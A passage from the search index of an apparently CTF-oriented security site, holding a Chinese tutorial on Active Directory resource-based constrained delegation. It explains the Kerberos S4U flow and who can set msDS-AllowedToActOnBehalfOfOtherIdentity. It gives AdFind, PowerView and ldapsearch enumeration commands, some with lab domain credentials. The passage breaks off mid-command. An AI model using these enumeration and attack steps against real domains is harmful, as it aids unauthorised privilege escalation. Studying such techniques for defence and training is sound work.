<p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1_1","title":"\uff081\uff09\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u6d41\u7a0b","text":"<p>\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7b80\u8981\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6574\u4e2a\u6d41\u7a0b\u5982\u4e0b\uff1a \u2460\uff1a\u670d\u52a1 A \u4f7f\u7528\u81ea\u5df1\u7684\u670d\u52a1\u8d26\u53f7\u5bc6\u7801\u5411 KDC \u7533\u8bf7\u4e00\u4e2a\u53ef\u8f6c\u53d1\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u3002 \u2461\uff1a\u670d\u52a1 A \u5229\u7528<code>S4U2Self</code>\u534f\u8bae\u4ee3\u8868\u7528\u6237\u7533\u8bf7\u4e00\u4e2a\u83b7\u5f97\u9488\u5bf9\u670d\u52a1 A \u81ea\u8eab\u7684 ST \u670d\u52a1\u7968\u636e\u3002\u8fd9\u4e00\u6b65\u533a\u522b\u4e8e\u4f20\u7edf\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002\u5728 <code>S4U2Self</code>\u534f\u8bae\u91cc\u9762\u63d0\u5230\uff0c\u8fd4\u56de\u7684 ST\u670d\u52a1\u7968\u636e\u53ef\u8f6c\u53d1\u7684\u4e00\u4e2a\u6761\u4ef6\u662f\u670d\u52a1 A \u914d\u7f6e\u4e86\u4f20\u7edf\u7684\u7ea6\u675f\u59d4\u6d3e\u3002KDC \u4f1a\u68c0\u67e5\u670d\u52a1 A\u7684 <code>msDS-AllowedToDelegateTo</code> \u5b57\u6bb5\uff0c\u5982\u679c\u8fd9\u4e2a\u5b57\u6bb5\u8d4b\u503c\u4e86\uff0c\u5219 KDC \u8fd4\u56de\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u91cc\u662f\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u662f\u5728\u670d\u52a1 B \u4e0a\u914d\u7f6e\u7684\uff0c\u670d\u52a1 B \u7684 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\u914d\u7f6e\u4e86\u670d\u52a1 A\u7684 SID\uff0c\u56e0\u6b64\u670d\u52a1 A \u5e76\u6ca1\u6709\u914d\u7f6e <code>msDS-AllowedToDelegateTo</code>\u5b57\u6bb5\u3002\u56e0\u6b64 KDC\u8fd4\u56de\u7684 ST \u670d\u52a1\u7968\u636e\u662f\u4e0d\u53ef\u8f6c\u53d1\u7684\u3002 \u2462\uff1a\u670d\u52a1 A \u5229\u7528 <code>S4U2Proxy</code> \u534f\u8bae\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u5411 KDC \u8bf7\u6c42\u8bbf\u95ee\u9488\u5bf9\u670d\u52a1 B \u7684\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e(\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684\u4e0d\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u653e\u5728\u8bf7\u6c42\u5305\u7684<code>AddtionTicket</code> \u91cc\u9762)\u3002KDC \u8fd4\u56de\u4e00\u5f20\u8bbf\u95ee\u670d\u52a1 B \u7684\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u3002 \u2463\uff1a\u670d\u52a1 A \u62ff\u7740\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u8bbf\u95ee\u670d\u52a1 B\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2_1","title":"\uff082\uff09\u8c01\u62e5\u6709\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u6743\u9650\uff1f","text":"<p>\u4ece\u4e0a\u9762\u6211\u4eec\u77e5\u9053\uff0c\u914d\u7f6e\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u7684 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\u7684\u503c\u4e3a\u88ab\u5141\u8bb8\u59d4\u6d3e\u8d26\u53f7\u7684 SID\u3002\u90a3\u4e48\uff0c\u8c01\u80fd\u4fee\u6539<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\uff0c\u5c31\u8bf4\u660e\u8c01\u62e5\u6709\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u6743\u9650\u4e86\uff01</p> <p>\u5728\u57df\u63a7\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u6307\u5b9a\u57df\u5185\u673a\u5668 win2012R2 \u7684 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\u3002</p> <pre><code>AdFind.exe -f \"&amp;(objectcategory=computer)(name=win2012R2)\" msDS-AllowedToActOnBehalfOfOtherIdentity\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u67e5\u8be2\u57df\u5185\u673a\u5668 win2012R2 \u7684 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\uff0c\u53d1\u73b0\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6ca1\u6709\u8be5\u5c5e\u6027\u3002</p> <p></p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u8c01\u80fd\u589e\u52a0\u673a\u5668\u8d26\u6237\u7684 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>\u5c5e\u6027\uff0c\u5c31\u8bf4\u660e\u8c01\u80fd\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002\u6211\u4eec\u4f7f\u7528 adfind \u67e5\u8be2 win2012R2\u673a\u5668\u7684 ACL\uff0c\u770b\u54ea\u4e9b\u7528\u6237\u5bf9\u5176\u6709\u4fee\u6539\u5c5e\u6027\u7684\u6743\u9650\uff0c\u67e5\u8be2\u547d\u4ee4\u5982\u4e0b\u6240\u793a</p> <pre><code>adfind.exe -b CN=WIN2012R2,CN=Computers,DC=xie,DC=com -sc getacl -sddl+++ -sddlfilter ;;\"WRT PROP\";;;\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u51fa\u9664\u4e86 administrator \u7528\u6237\u5916\uff0cxie\\hack \u7528\u6237\u548c SELF \u81ea\u8eab\u62e5S\u6709\u4fee\u6539\u5c5e\u6027\u7684\u6743\u9650\u3002</p> <p></p> <p>administrator \u548c SELF \u81ea\u8eab\u62e5\u6709\u4fee\u6539\u5c5e\u6027\u6743\u9650\u597d\u7406\u89e3\uff0c\u90a3\u4e48\u4e3a\u5565 <code>xie\\hack</code> \u7528\u6237\u4e5f\u62e5\u6709\u4fee\u6539\u5c5e\u6027\u7684\u6743\u9650\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a win2012R2 \u673a\u5668\u662f\u901a\u8fc7 <code>xie\\hack</code> \u7528\u6237\u52a0\u5165\u57df\u7684\uff0c\u56e0\u6b64 <code>xie\\hack</code> \u7528\u6237\u62e5\u6709\u4fee\u6539 win2012R2 \u673a\u5668\u5c5e\u6027\u7684\u6743\u9650\u3002\u5e76\u4e14win2012R2 \u673a\u5668\u7684 <code>mS-DS-CreatorSID</code> \u5c5e\u6027\u7684\u503c\u4e3a <code>xie\\hack</code> \u7528\u6237\u7684 SID\uff0c\u6211\u4eec\u901a\u8fc7 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u53ef\u4ee5\u9a8c\u8bc1\u8be5\u7ed3\u8bba\u3002</p> <pre><code>#\u67e5\u8be2 win2012r2 \u673a\u5668\u7684 mS-DS-CreatorSID \u5c5e\u6027\nAdFind.exe -f \"&amp;(objectcategory=computer)(name=win2012R2)\" mS-DS-CreatorSID\n\n#\u67e5\u8be2 sid \u5bf9\u5e94\u7684\u7528\u6237\nAdFind.exe -sc adsid:S-1-5-21-1313979556-3624129433-4055459191-1105\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 win2012R2 \u673a\u5668\u7684 <code>mS-DS-CreatorSID</code> \u5c5e\u6027\u7684\u503c\u786e\u5b9e\u4e3a<code>xie\\hack</code> \u7528\u6237\u7684 SID\u3002</p> <p></p> <p>\u7ed3\u8bba\uff1a\u4e5f\u5c31\u662f\u8bf4\uff0c\u9664\u4e86\u4f20\u7edf\u7684\u57df\u7ba1\u7406\u5458\u7b49\u9ad8\u6743\u9650\u7528\u6237\u5916\uff0c\u673a\u5668\u81ea\u8eab\u548c\u5c06\u673a\u5668\u52a0\u5165\u57df\u7684\u57df\u7528\u6237\u62e5\u6709\u4fee\u6539\u673a\u5668 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u7684\u6743\u9650\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3_1","title":"\uff083\uff09\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4f18\u52bf","text":"<p>\u90a3\u4e48\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u76f8\u6bd4\u57df\u5176\u4ed6\u4e24\u79cd\u7c7b\u578b\u7684\u59d4\u6d3e\u6709\u5565\u4f18\u52bf\u5462\uff1f</p> <ul> <li>\u59d4\u6d3e\u7684\u6388\u4e88\u6743\u9650\u7ed9\u4e86\u62e5\u6709\u8d44\u6e90\u7684\u540e\u7aef\uff0c\u800c\u4e0d\u662f\u524d\u7aef\u3002</li> <li>\u7ea6\u675f\u6027\u59d4\u6d3e\u4e0d\u80fd\u8de8\u57df\u8fdb\u884c\u59d4\u6d3e\uff0c\u800c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u53ef\u4ee5\u8de8\u57df\u548c\u6797\u3002</li> <li>\u4e0d\u518d\u9700\u8981\u57df\u7ba1\u7406\u5458\u6743\u9650\u8bbe\u7f6e\uff0c\u53ea\u9700\u62e5\u6709\u5728\u8ba1\u7b97\u673a\u5bf9\u8c61\u4e0a\u7f16\u8f91<code>msDS- AllowedToActOnBehalfOfOtherIdentity</code>\u5c5e\u6027\u7684\u6743\u9650\uff0c\u4e5f\u5c31\u662f \u5c06\u8ba1\u7b97\u673a\u52a0\u5165\u57df\u7684\u57df\u7528\u6237 \u548c \u673a\u5668\u81ea\u8eab \u90fd\u62e5\u6709\u8be5\u6743\u9650\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#4","title":"\uff084\uff09\u7ea6\u675f\u6027\u59d4\u6d3e\u548c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u914d\u7f6e\u7684\u5dee\u522b","text":"<p>\u90a3\u4e48\u7ea6\u675f\u6027\u59d4\u6d3e\u548c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u5728\u914d\u7f6e\u4e0a\u6709\u4f55\u5dee\u522b\u5462\uff1f</p> <ul> <li>\u4f20\u7edf\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u662f\u201c\u6b63\u5411\u7684\u201d\uff0c\u901a\u8fc7\u4fee\u6539\u670d\u52a1\u8d26\u6237 A \u7684<code>msDS- AllowedToDelegateTo</code>\u5c5e\u6027\uff0c\u6dfb\u52a0\u670d\u52a1 B \u7684<code>SPN\uff08Service Principle Name\uff09</code>\uff0c\u8bbe\u7f6e\u7ea6\u675f\u59d4\u6d3e\u5bf9\u8c61\u4e3a\u670d\u52a1 B\uff0c\u670d\u52a1 A \u4fbf\u53ef\u4ee5\u6a21\u62df\u4efb\u610f\u7528\u6237\u5411\u57df\u63a7\u5236\u5668\u8bf7\u6c42\u8bbf\u95ee\u670d\u52a1 B \u7684 ST \u670d\u52a1\u7968\u636e\u3002</li> <li>\u800c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u5219\u662f\u76f8\u53cd\uff0c\u901a\u8fc7\u4fee\u6539\u670d\u52a1 B \u7684<code>msDS- AllowedToActOnBehalfOfOtherIdentity</code>\u5c5e\u6027\uff0c\u6dfb\u52a0\u670d\u52a1 A \u7684 <code>SID</code>\uff0c\u8fbe\u5230\u8ba9\u670d\u52a1 A \u6a21\u62df\u4efb\u610f\u7528\u6237\u8bbf\u95ee\u670d\u52a1 B \u8d44\u6e90\u7684\u76ee\u7684\u3002</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u4e24\u8005\u914d\u7f6e\u7684\u5dee\u522b\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#5","title":"\uff085\uff09\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb","text":"<p>\u8be5\u653b\u51fb\u7531\u56fd\u5916\u5b89\u5168\u7814\u7a76\u5458 Elad Shami \u63d0\u51fa\uff0c\u4ed6\u5728\u6587\u7ae0\u4e2d\u6307\u51fa\u65e0\u8bba\u670d\u52a1\u8d26\u53f7\u7684<code>UserAccountControl</code> \u5c5e\u6027\u662f\u5426\u88ab\u8bbe\u7f6e\u4e3a<code>TRUETED_TO_AUTHENTICATE_FOR_DELEGATION</code> \u503c\uff0c\u670d\u52a1\u81ea\u8eab\u90fd\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 <code>S4U2Self</code> \u6765\u4e3a\u4efb\u610f\u7528\u6237\u8bf7\u6c42\u81ea\u8eab\u7684\u670d\u52a1\u7968\u636e\u3002\u4f46\u662f\u5f53\u6ca1\u6709\u8bbe\u7f6e\u8be5\u5c5e\u6027\u65f6\uff0cKDC \u901a\u8fc7\u68c0\u67e5\u8d26\u53f7\u7684 <code>msDS-AllowedToDelegateTo</code> \u5b57\u6bb5\uff0c\u53d1\u73b0\u6ca1\u6709\u88ab\u8d4b\u503c\uff0c\u6240\u4ee5\u670d\u52a1\u81ea\u8eab\u901a\u8fc7<code>S4U2Self</code>\u8bf7\u6c42\u5230\u7684 ST \u670d\u52a1\u7968\u636e\u662f\u4e0d\u53ef\u8f6c\u53d1\u7684\uff0c\u56e0\u6b64\u4e0d\u53ef\u8f6c\u53d1\u7684ST \u670d\u52a1\u7968\u636e\u662f\u65e0\u6cd5\u901a\u8fc7<code>S4U2Proxy</code>\u534f\u8bae\u8f6c\u53d1\u5230\u5176\u4ed6\u670d\u52a1\u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u8ba4\u8bc1\u7684\u3002\u4f46\u662f\uff01\u5728\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 <code>S4U2Proxy</code> \u534f\u8bae\u8f6c\u53d1\u5230\u5176\u4ed6\u670d\u52a1\u8fdb\u884c\u59d4\u6d3e\u8ba4\u8bc1\uff0c\u5e76\u4e14\u6700\u540e\u670d\u52a1\u8fd8\u4f1a\u8fd4\u56de\u4e00\u5f20\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u8fd9\u662f\u5fae\u8f6f\u7684\u8bbe\u8ba1\u7f3a\u9677\uff01\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u80fd\u591f\u5728\u670d\u52a1 B \u4e0a\u914d\u7f6e\u5141\u8bb8\u670d\u52a1 A \u7684\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u670d\u52a1 A \u4f7f\u7528<code>S4U2Self</code> \u534f\u8bae\u5411\u57df\u63a7\u8bf7\u6c42\u4efb\u610f\u7528\u6237\u8bbf\u95ee\u81ea\u8eab\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u6700\u540e\u518d\u4f7f\u7528<code>S4U2Proxy</code> \u534f\u8bae\u8f6c\u53d1\u6b64 ST \u670d\u52a1\u7968\u636e\u53bb\u8bf7\u6c42\u8bbf\u95ee\u670d\u52a1 B \u7684\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6a21\u62df\u4efb\u610f\u7528\u6237\u8bbf\u95ee\u670d\u52a1 B \u4e86\u3002\u800c\u8fd9\u91cc\u6211\u4eec\u63a7\u5236\u7684\u670d\u52a1 A \u53ef\u4ee5\u4ee5\u666e\u901a\u57df\u7528\u6237\u7684\u8eab\u4efd\u53bb\u521b\u5efa\u673a\u5668\u8d26\u53f7\u3002</p> <p>\u5f15\u7528\u535a\u5ba2\u6587\u7ae0\u4e2d\u7684\u4e00\u5f20\u56fe\u8bf4\u660e\u8be5\u653b\u51fb\u6b65\u9aa4\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u8981\u60f3\u8fdb\u884c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\uff0c\u9700\u8981\u5177\u5907\u4e0b\u9762\u4e24\u4e2a\u6761\u4ef6\uff1a</p> <ul> <li>\u62e5\u6709\u670d\u52a1 A \u7684\u6743\u9650\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u9700\u8981\u62e5\u6709\u4e00\u4e2a\u666e\u901a\u7684\u57df\u8d26\u53f7\u6743\u9650\u5373\u53ef\uff0c\u56e0\u4e3a\u666e\u901a\u7684\u57df\u8d26\u6237\u9ed8\u8ba4\u53ef\u4ee5\u521b\u5efa\u6700\u591a\u5341\u4e2a\u673a\u5668\u8d26\u53f7\u3002\u673a\u5668\u8d26\u53f7\u53ef\u4ee5\u4f5c\u4e3a\u670d\u52a1\u8d26\u53f7\u4f7f\u7528\u3002</li> <li>\u62e5\u6709\u5728\u670d\u52a1 B \u4e0a\u914d\u7f6e\u5141\u8bb8\u670d\u52a1 A \u7684\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u6743\u9650\uff0c\u5373\u62e5\u6709\u4fee\u6539\u670d\u52a1 B \u7684 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\u7684\u6743\u9650\u3002\u800c\u673a\u5668\u8d26\u53f7\u81ea\u8eab\u548c\u521b\u5efa\u673a\u5668\u8d26\u53f7\u7684\u7528\u6237\u5373\u62e5\u6709\u8be5\u6743\u9650\u3002</li> </ul> <p>\u6240\u4ee5\uff0c\u4ee5\u4e0a\u4e24\u4e2a\u6761\u4ef6\u53ef\u4ee5\u8f6c\u6362\u4e3a\u62e5\u6709 \u5c06\u673a\u5668\u52a0\u5165\u57df\u7684\u57df\u7528\u6237\u7684\u6743\u9650 \u6216 \u673a\u5668\u81ea\u8eab\u7684\u6743\u9650\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_6","title":"\u67e5\u8be2\u59d4\u6d3e\u5c5e\u6027\u7684\u8d26\u53f7","text":"<p>\u67e5\u8be2\u57df\u4e2d\u5177\u6709\u59d4\u6d3e\u5c5e\u6027\u7684\u8d26\u53f7\u53ef\u4ee5\u4f7f\u7528 LDAP \u534f\u8bae\uff0c\u901a\u8fc7\u8fc7\u6ee4<code>userAccountControl</code> \u5c5e\u6027\u7b5b\u9009\u51fa\u670d\u52a1\u8d26\u53f7\u548c\u673a\u5668\u8d26\u53f7\uff0c\u673a\u5668\u8d26\u53f7<code>samAccountType=805306369</code>\uff0c\u800c\u670d\u52a1\u8d26\u53f7 <code>samAccountType=805306368</code>\u3002\u518d\u901a\u8fc7 <code>allowedtodelegateto</code> \u548c <code>AllowedToActOnBehalfOfOtherIdentity</code> \u5c5e\u6027\u7b5b\u9009\u51fa\u4e0d\u540c\u7684\u59d4\u6d3e\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1_2","title":"1.\u67e5\u8be2\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u4e3b\u673a\u6216\u670d\u52a1\u8d26\u6237","text":"<p>\u67e5\u8be2\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u6216\u670d\u52a1\u8d26\u53f7\u53ef\u4ee5\u4f7f\u7528 powershell \u811a\u672c\u3001adfind \u6216ldapsearch \u7b49\u5de5\u5177\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1powershell","title":"\uff081\uff09powershell \u811a\u672c","text":"<p>\u5229\u7528 PowerSploit \u4e0b\u7684 PowerView.ps1 \u811a\u672c\u67e5\u8be2\uff0c\u4f7f\u7528\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\PowerView.ps1;\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u4e3b\u673a\nGet-NetComputer -Unconstrained -Domain xie.com\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\nGet-NetUser -Unconstrained -Domain xie.com | select name\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528\u8be5\u811a\u672c\u67e5\u8be2\u51fa\u57df\u4e2d\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u6709 AD01 \u548c AD02\uff0c\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u53f7\u6709 service_account\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2adfind","title":"\uff082\uff09adfind","text":"<p>\u5229\u7528 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fc7\u6ee4 samAccountType \u548c userAccountControl \u5c5e\u6027\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u57df\u5185\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u548c\u670d\u52a1\u8d26\u53f7\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u4e3b\u673a\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -dn\n\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -dn\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3ldapsearch","title":"\uff083\uff09ldapsearch","text":"<p>\u5229\u7528 ldapsearch \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fc7\u6ee4 samAccountType \u548c userAccountControl\u5c5e\u6027\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u57df\u5185\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u548c\u670d\u52a1\u8d26\u53f7\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u4e3b\u673a\nldapsearch -x -H ldap://10.211.55.4:389 -D \"hack@xie.com\" -w P@ss1234 -b \" DC=xie,DC=com\" \"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" | grep dn\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\nldapsearch -x -H ldap://10.211.55.4:389 -D \"hack@xie.com\" -w P@ss1234 -b \" DC=xie,DC=com\" \"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" | grep dn\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2_2","title":"2.\u67e5\u8be2\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u6216\u670d\u52a1\u8d26\u6237","text":"<p>\u67e5\u8be2\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u6216\u670d\u52a1\u8d26\u53f7\u53ef\u4ee5\u4f7f\u7528 powershell \u811a\u672c\u3001adfind \u6216ldapsearch \u7b49\u5de5\u5177\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1powershell_1","title":"\uff081\uff09powershell \u811a\u672c","text":"<p>\u5229\u7528 Empire \u4e0b\u7684 powerview.ps1 \u811a\u672c\uff0c\u4f7f\u7528\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\powerview.ps1;\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\nGet-DomainComputer -TrustedToAuth -Domain xie.com | select name,msds-allowedtodelegateto\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u8d26\u53f7\nGet-DomainUser -TrustedToAuth -Domain xie.com | select name,msds-allowedtodelegateto\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2adfind_1","title":"\uff082\uff09adfind","text":"<p>\u5229\u7528 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fc7\u6ee4 samAccountType \u548c userAccountControl \u5c5e\u6027\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u57df\u5185\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u548c\u670d\u52a1\u8d26\u53f7\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\uff0c\u5e76\u53ef\u4ee5\u770b\u5230\u88ab\u59d4\u6d3e\u7684 SPN\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))\" msds-allowedtodelegateto\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\uff0c\u5e76\u53ef\u4ee5\u770b\u5230\u88ab\u59d4\u6d3e\u7684 SPN\nAdFind.exe -b \"DC=xie,DC=com\" -f \"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))\" msds-allowedtodelegateto\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3ldapsearch_1","title":"\uff083\uff09ldapsearch","text":"<p>\u5229\u7528 ldapsearch \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fc7\u6ee4 samAccountType \u548c userAccountControl\u5c5e\u6027\uff0c\u5373\u53ef\u67e5\u8be2\u51fa\u57df\u5185\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\u548c\u670d\u52a1\u8d26\u53f7\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u4e3b\u673a\uff0c\u5e76\u53ef\u4ee5\u770b\u5230\u88ab\u59d4\u6d3e\u7684 SPN\nldapsearch -x -H ldap://10.211.55.4:389 -D \"hack@xie.com\" -w P@ss1234 -b \" DC=xie,DC=com\" \"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*)) \" | grep -e dn -e msDS-AllowedToDelegateTo\n\n#\u67e5\u8be2\u57df\u4e2d\u914d\u7f6e\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1\u8d26\u6237\uff0c\u5e76\u53ef\u4ee5\u770b\u5230\u88ab\u59d4\u6d3e\u7684 SPN\nldapsearch -x -H ldap://10.211.55.4:389 -D \"hack@xie.com\" -w P@ss1234 -b \" DC=xie,DC=com\" \"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*)) \" | grep -e dn -e 